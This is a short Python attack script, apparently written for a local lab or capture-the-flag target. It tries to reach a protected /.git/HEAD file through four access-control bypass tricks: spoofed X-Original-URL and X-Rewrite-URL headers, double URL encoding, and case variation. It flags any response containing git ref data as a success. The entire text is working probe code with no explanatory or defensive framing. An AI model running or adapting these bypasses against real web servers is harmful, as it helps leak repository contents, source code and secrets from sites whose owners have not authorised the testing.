import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

target = "http://127.0.0.1:32867"

# Create session with retry logic
session = requests.Session()
retry = Retry(total=2, backoff_factor=0.1)
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)

print("Testing .git bypass techniques\n")

tests = [
    ("X-Original-URL header", f"{target}/.git/HEAD", {"X-Original-URL": "/.git/HEAD"}),
    ("X-Rewrite-URL header", f"{target}/.git/HEAD", {"X-Rewrite-URL": "/.git/HEAD"}),
    ("Double encoding", f"{target}/%252egit/HEAD", {}),
    ("Case variation", f"{target}/.GIT/HEAD", {}),
]

for name, url, headers in tests:
    try:
        print(f"[*] {name}")
        resp = session.get(url, headers=headers, timeout=2, allow_redirects=False)
        print(f"    Status: {resp.status_code}")
        print(f"    Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
        
        if resp.status_code == 200:
            if 'ref:' in resp.text:
                print(f"    [SUCCESS] Git data found: {resp.text}")
            elif len(resp.text) < 300:
                print(f"    Response: {resp.text}")
            else:
                print(f"    Response (first 150 chars): {resp.text[:150]}")
        print()
    except requests.exceptions.RequestException as e:
        print(f"    Error: {type(e).__name__}: {str(e)[:100]}")
        print()
    except Exception as e:
        print(f"    Unexpected error: {e}")
        print()

print("Testing complete")

